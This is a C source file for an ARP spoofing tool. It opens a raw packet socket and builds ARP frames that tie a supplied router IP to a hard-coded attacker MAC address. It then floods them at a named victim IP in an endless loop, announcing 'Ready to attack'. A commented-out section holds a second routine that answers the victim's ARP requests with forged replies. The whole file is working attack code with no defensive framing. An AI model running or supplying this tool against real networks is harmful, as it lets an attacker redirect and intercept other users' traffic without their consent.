#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<stdint.h>
#include<assert.h>
#include<errno.h>
#include<unistd.h>
#include<netinet/ip.h>
#include<linux/if_arp.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <sys/socket.h>


#define FRAME_SIZE 42
#define ETHERNET_LINK_SIZE 14

#define ARP_REQUEST 1
#define ARP_REPLY 2

typedef struct _arp_hdr arp_hdr;
struct _arp_hdr {
  	uint16_t htype;
    	uint16_t ptype;
      	uint8_t hlen;
        uint8_t plen;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};


char* router_ip;
char* victim_ip;



void fill_victims_MAC(uint8_t* buff)
{
	
	buff[0] = 0xFF;
	buff[1] = 0xFF;
	buff[2] = 0xFF;
	buff[3] = 0xFF;
	buff[4] = 0xFF;
	buff[5] = 0xFF;
      
       /*buff[0] = 0xd4;
	buff[1] = 0x6a;
	buff[2] = 0x6a;
	buff[3] = 0xb9;
	buff[4] = 0xb4;
	buff[5] = 0xe1;*/

       
}


void fill_attacker_MAC(uint8_t* buff)
{
	
	buff[0] = 0x68;
	buff[1] = 0xec;
	buff[2] = 0xc5;
	buff[3] = 0x07;
	buff[4] = 0xca;
	buff[5] = 0x8d;
}



uint8_t* create_buffer(int len)
{
	if( len<0 )
	{
		printf("Invalid size for buffer\n");
		exit(EXIT_FAILURE);
	} 
	
	
	uint8_t* buffer = (uint8_t*)malloc(sizeof(uint8_t)*len);
	if( buffer == NULL )
	{
		perror("Error in allocating the memory in create_buffer\n");
		exit(0);
	}
	
	if( memset(buffer,0,len) == -1 )
	{
		perror("Error in memset\n");
		exit(0);
	}
	return buffer;
}


int get_if_no(char* if_name)
{
	struct ifreq ifr;
	
	size_t if_name_len = strlen(if_name);
	
	if (if_name_len<sizeof(ifr.ifr_name)) {
	    memcpy(ifr.ifr_name,if_name,if_name_len);
	    ifr.ifr_name[if_name_len]=0;
	} else {
	    printf("interface name is too long");
	    exit(EXIT_FAILURE);
	}
	
	
	
	int fd = socket(AF_UNIX,SOCK_DGRAM,0);
	if (fd==-1) {
	    printf("socket error in get_if");
	    exit(0);
	}
	
	if (ioctl(fd,SIOCGIFINDEX,&ifr)==-1) {
	    printf(" error in get_if");
	    exit(0);
	}
	
	return ifr.ifr_ifindex;
}


int main(int argc, char* argv[])
{
		if( argc != 4 )
		{
			printf("Invalid args\nUsage: Interface router_ip victim_ip\n");
			exit(EXIT_FAILURE);
		}
		router_ip = argv[2];
		victim_ip = argv[3];
		int i;	
		int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
		if( fd == -1 )
		{
			perror("Error opening ARP Socket\n");
			exit(EXIT_FAILURE);
		}
		

		printf("\nSocket created!\n");
		
		uint8_t* buffer = create_buffer(FRAME_SIZE);
		
		
		fill_victims_MAC(buffer);

		fill_attacker_MAC(buffer+6);
		uint16_t* opcode = (uint16_t*)(buffer+12);
		*opcode = htons(0x0806);

		arp_hdr* arph = (arp_hdr*)(buffer+14);

		arph->htype = htons(1);
		arph->ptype = htons(0x800);
		arph->hlen = 6;
		arph->plen = 4;
		arph->opcode = htons(1);

		fill_attacker_MAC((uint8_t*)&(arph->sender_mac));
		//fill_attacker_MAC((uint8_t*)&(arph->target_mac));
		
                fill_victims_MAC((uint8_t*)&(arph->target_mac));
		inet_pton(AF_INET, router_ip , arph->sender_ip);


		inet_pton(AF_INET, victim_ip, arph->target_ip);

		struct sockaddr_ll socket_address;
		socket_address.sll_family   = PF_PACKET;	
		socket_address.sll_protocol = htons(ETH_P_ARP);
		
		socket_address.sll_ifindex  = get_if_no(argv[1]);
		socket_address.sll_hatype   = ARPHRD_ETHER;
		socket_address.sll_pkttype  = PACKET_OTHERHOST;
		socket_address.sll_halen    = ETH_ALEN;		
		socket_address.sll_addr[0]  = buffer[0];		
		socket_address.sll_addr[1]  = buffer[1];		
		socket_address.sll_addr[2]  = buffer[2];
		socket_address.sll_addr[3]  = buffer[3];
		socket_address.sll_addr[4]  = buffer[4];
		socket_address.sll_addr[5]  = buffer[5];
		
		
		printf("Ready to attack\n");
		sleep(1);
		printf("1\n");
		sleep(1);
		printf("2\n");
		sleep(1);
		printf("3\n");
		sleep(1);

		int n = 0;
		while(1)
		{
			if( sendto(fd,buffer,42,0,(struct sockaddr*)&socket_address, sizeof(socket_address)) < 0 )
			{
				perror("Error sending\n");
				exit(0);
			}
			printf("ARP Packet %d. Sent to the address %s\n",(n+1),victim_ip);
			fflush(stdout);
			usleep(1000);
			n++;
                        //break;
		}
	
		/*uint8_t src[6];
		uint8_t dst[6];
		
		fill_victims_MAC(src);
		fill_attacker_MAC(dst);

		while(1)
		{	

			memset(buffer,0,42);
			
			if( recv(fd, buffer, 42, 0) == -1 )
			{
				perror("");
				exit(0);
			}
			
			if( ( memcmp(buffer,dst,6) | memcmp(buffer+6,src,6) ) == 0 )
			{
				arp_hdr* hdr = (arp_hdr*)(buffer+14);
				if( hdr->opcode == htons(1) )
				{
					hdr->opcode = htons(2);
					inet_pton(AF_INET, victim_ip,hdr->target_ip);
					fill_victims_MAC((uint8_t*)hdr->target_mac);
					
					inet_pton(AF_INET, router_ip,hdr->sender_ip);
					fill_attacker_MAC((uint8_t*)hdr->sender_mac);

					uint8_t temp[6];
					memcpy(temp,buffer,6);
					memcpy(buffer,buffer+6,6);
					memcpy(buffer+6,temp,6);

					
					if( sendto(fd,buffer,42,0,(struct sockaddr*)&socket_address, sizeof(socket_address)) < 0 )
					{
						perror("Error sending\n");
						exit(0);
					}
					printf("Replied succesfully\n");
				}
			}
		}*/
		free(buffer);
}

